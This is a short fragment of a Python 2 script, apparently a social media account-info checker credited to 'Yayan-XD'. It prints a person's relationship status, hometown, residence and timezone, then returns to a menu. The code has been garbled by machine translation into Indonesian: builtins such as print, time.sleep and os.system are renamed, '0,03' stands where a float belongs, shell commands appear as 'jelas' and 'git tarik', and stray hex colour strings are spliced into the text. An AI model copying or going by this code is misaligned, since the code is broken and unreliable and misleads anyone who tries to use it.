    cetak  ' [' + m + '!' + c + ']' + p + 'Status Hubungan : %s %s' % ( stas , dgn ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Status Terentang : %s' % ( bioo ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Kota Asal : %s' % ( dari ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Tinggal : %s' % ( tigl ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Zona Waktu : %s' % ( tzim ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Terahir DiUpdate : %s' % ( uptd ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + '---------------------------------------- --------' + b + '⟩⟩'
    waktu . tidur ( 3 )
    print ( p + "Penulis : Yayan-XD" )
    print ( p + "Tulisan Kata : Mr.Risky" )
    waktu . tidur ( 2 )
    print ( "Sukses mengec#82FF00ek info akun !!" )
    raw_input ( ' \n   [ %sKEMBALI%s ] ' % ( O , N ))
    menu ()
    

if  __name__  ==  '__main__' :
    os . sistem ( 'jelas' )
    logo ()
    print  ' [#] Sebentar Lagi Update...'
    os . sistem ( 'git tarik' )
    masuk ()#151D0C
